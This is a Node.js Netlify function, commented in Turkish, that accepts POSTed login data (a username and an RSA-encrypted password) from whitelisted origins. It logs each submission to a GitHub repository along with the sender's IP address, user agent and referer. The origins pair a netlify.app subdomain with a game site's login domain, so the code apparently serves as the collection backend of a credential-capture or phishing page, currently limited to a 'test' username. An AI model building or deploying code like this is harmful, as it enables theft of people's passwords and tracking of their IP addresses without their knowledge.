// netlify/functions/log-admin-capture.js
// Sadece GEÇERLİ admin POST'u geldiğinde GitHub'a log yazar; diğer her durumda 204 döner (dosya yazmaz).

// === Ayarlar (env ile override edilebilir) ===
const OWNER   = process.env.GITHUB_OWNER  || "Devrim-Sert";
const REPO    = process.env.GITHUB_REPO   || "REPO";
const LOG_DIR = process.env.LOG_DIR       || "logs/admin";
const TOKEN   = process.env.GITHUB_TOKEN;
const BRANCH  = process.env.GITHUB_BRANCH || "main";

// CSV: "https://example.com,https://www.example.com"
const ORIGIN_WHITELIST_ENV = (process.env.ORIGIN_WHITELIST || "")
  .split(",")
  .map(s => s.trim())
  .filter(Boolean);

// Varsayılan whitelist + env ile gelenler
const ORIGIN_WHITELIST = [
  "https://candid-capybara-606c8d.netlify.app",
  "https://sonoyuncu.com.tr",
  "https://giris.sonoyuncu.com.tr",
  ...ORIGIN_WHITELIST_ENV,
];

function parseHostname(u) {
  try { return new URL(u).host.toLowerCase(); }
  catch(_) { return (u || "").replace(/^https?:\/\//, "").toLowerCase(); }
}

function okMethod(method) { return method === "POST"; }

function okOrigin(headers = {}) {
  const originOrRef = (headers.origin || headers.referer || "").toString();
  const incomingHost = (headers.host || "").toString().toLowerCase();

  // 1) Mevcut sitenin kendi host'u otomatik kabul (preview/custom domain)
  const allowedHosts = new Set(ORIGIN_WHITELIST.map(parseHostname));
  if (incomingHost && (allowedHosts.has(incomingHost))) return true;

  // 2) Origin/Referer host whitelist'te mi?
  const refHost = parseHostname(originOrRef);
  if (refHost && allowedHosts.has(refHost)) return true;

  console.warn("skip: origin check failed", { incomingHost, refHost, allowed: [...allowedHosts] });
  return false;
}

function parseBody(body) {
  try { return JSON.parse(body || "{}"); } catch {
    console.warn("skip: body not JSON");
    return null;
  }
}

// SADECE gerçek admin yüklerini kabul et
function isRealPayload(p) {
  if (!p) { console.warn("skip: no payload"); return false; }
  if (p.kind !== "admin_capture") { console.info("skip: kind mismatch", p.kind); return false; }
  if ((p.username || "").toLowerCase() !== "test") { console.info("skip: username ≠ test"); return false; }
  if (typeof p.pw_enc_b64 !== "string") { console.info("skip: pw_enc_b64 not string"); return false; }

  // Base64 minimal kontrol + uzunluk (4096-bit RSA OAEP ~512 byte → b64 ~684+ char)
  if (p.pw_enc_b64.length < 300) { console.info("skip: pw_enc_b64 too short"); return false; }
  // (opsiyonel) Geçersiz base64 yakalamak için kısa bir deneme (dosya yazmadan):
  try { Buffer.from(p.pw_enc_b64, "base64"); } catch { console.info("skip: invalid base64"); return false; }

  return true;
}

function buildPath(now, payload) {
  const day  = now.toISOString().slice(0, 10);            // YYYY-MM-DD
  const time = now.toISOString().replace(/[:.]/g, "-");   // dosya adı güvenli
  const nonce = payload && payload.nonce ? `-${payload.nonce}` : "";
  return `${LOG_DIR}/${day}/${time}${nonce}.json`;
}

// Bağımlılıksız GitHub yazma (PUT /repos/:owner/:repo/contents/:path)
async function githubWrite(path, message, contentB64) {
  const url = `https://api.github.com/repos/${OWNER}/${REPO}/contents/${encodeURI(path)}`;
  const res = await fetch(url, {
    method: "PUT",
    headers: {
      "Authorization": `Bearer ${TOKEN}`,
      "User-Agent": "netlify-fn",
      "Accept": "application/vnd.github+json",
      "X-GitHub-Api-Version": "2022-11-28",
      "Content-Type": "application/json",
    },
    body: JSON.stringify({
      message,
      content: contentB64,
      branch: BRANCH,
    }),
  });

  if (!res.ok) {
    const text = await res.text().catch(() => "");
    console.error("GitHub write failed:", res.status, text);
    throw new Error(`GitHub write failed: ${res.status}`);
  }
}

exports.handler = async (event) => {
  const cors = {
    "Access-Control-Allow-Origin": "*",
    "Access-Control-Allow-Methods": "POST,OPTIONS",
    "Access-Control-Allow-Headers": "Content-Type",
  };

  // CORS preflight
  if (event.httpMethod === "OPTIONS") {
    return { statusCode: 204, headers: cors };
  }

  // 1) POST değil → yazma
  if (!okMethod(event.httpMethod)) {
    return { statusCode: 204, headers: cors, body: "skip" };
  }

  // 2) Origin/Referer whitelist değilse → yazma
  if (!okOrigin(event.headers || {})) {
    return { statusCode: 204, headers: { ...cors, "X-Skip-Reason": "origin" }, body: "skip" };
  }

  // 3) Body JSON değilse → yazma
  const payload = parseBody(event.body);
  if (!payload) {
    return { statusCode: 204, headers: { ...cors, "X-Skip-Reason": "json" }, body: "skip" };
  }

  // 4) Admin payload değilse → yazma
  if (!isRealPayload(payload)) {
    return { statusCode: 204, headers: { ...cors, "X-Skip-Reason": "payload" }, body: "skip" };
  }

  // 5) GERÇEK log yaz
  if (!TOKEN) {
    console.error("missing GITHUB_TOKEN env");
    return { statusCode: 500, headers: cors, body: "missing GITHUB_TOKEN" };
  }

  const now = new Date();
  const path = buildPath(now, payload);
  const contentObj = {
    ts: now.toISOString(),
    username: payload.username,       // "test"
    pw_enc_b64: payload.pw_enc_b64,   // şifrelenmiş (Base64)
    ua: (event.headers && event.headers["user-agent"]) || null,
    ip: (event.headers && event.headers["x-nf-client-connection-ip"]) || null,
    referer: (event.headers && event.headers.referer) || null,
    host: (event.headers && event.headers.host) || null,
  };
  const contentB64 = Buffer.from(JSON.stringify(contentObj, null, 2)).toString("base64");

  try {
    await githubWrite(path, `admin log ${now.toISOString()}`, contentB64);
    return { statusCode: 200, headers: cors, body: "logged" };
  } catch (err) {
    return { statusCode: 500, headers: cors, body: `error: ${err.message || "write failed"}` };
  }
};
